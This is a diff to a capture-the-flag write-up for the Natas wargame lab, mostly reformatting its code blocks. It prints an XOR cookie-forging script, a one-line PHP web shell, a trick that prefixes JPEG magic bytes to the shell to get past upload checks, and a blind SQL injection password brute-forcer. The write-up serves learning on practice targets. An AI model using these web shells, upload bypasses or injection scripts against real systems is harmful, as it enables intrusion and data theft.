@@ -86,8 +86,9 @@ Cookies are protected using XOR encryption
 3. Adjust the xor_encryption PHP function to obtain the encryption key
 
 	- Code:
-	
-"\<?  
+
+~~~
+<?  
 $orig_cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');  
 function xor_encrypt($in) {  
   $text = $in;  
@@ -100,12 +101,14 @@ function xor_encrypt($in) {
   return $outText;  
 }  
 print xor_encrypt($orig_cookie);
-?\>"
+?>
+~~~
 
 4. Using the key: "qw8j", encrypt a new base64-encoded data cookie, with "showpassword"=>"yes"
 
 	- Code:
 
+~~~
 function xor_encrypt() {  
   $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));  
   $key = "qw8J";    
@@ -117,6 +120,7 @@ function xor_encrypt() {
   return $outText;  
 }  
 print base64_encode(xor_encrypt());
+~~~
 
 ## natas12 -> natas13
 [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
@@ -126,10 +130,12 @@ print base64_encode(xor_encrypt());
 	
 2. Create PHP Script:
 
-"\<?  
+~~~
+<?  
  // Rudimentary Shell   
  passthru($_GET['cmd']);  
- ?\>"  
+?>
+~~~
 
 3. Upload PHP Script
 4. Using burp Suite, modify the packet so that the filename and type of the script is the PHP script
@@ -146,6 +152,13 @@ Magic Numbers
 2. Using Python, create a PHP script which includes the JPEG File Signature/Magic Number
 
 	- Adding the File Signature to the beginning of the PHP file tricks the function into thinking the uploaded file is a JPEG rather than a PHP script
+	- Code:
+	
+~~~
+>>> fh = file.open('shell.php', 'w')
+>>> fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET['cmd']); ?>')
+>>> fh.close()
+~~~
 	
 3. Upload PHP Script
 4. Using burp Suite, modify the packet so that the filename and type of the script is the PHP script
@@ -174,8 +187,9 @@ Blind SQL Injection
 2. Using Python, program a script which will test characters that match with the password stored in the password field in the 'users' table
 
 	- Code:
-	
-"import requests
+
+~~~
+import requests
 from requests.auth import HTTPBasicAuth
 
 chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
@@ -195,4 +209,5 @@ for i in range(0,32):
         if 'exists' in r.text :
             passwd = passwd + char
             print(passwd)
-            break"
+            break
+~~~
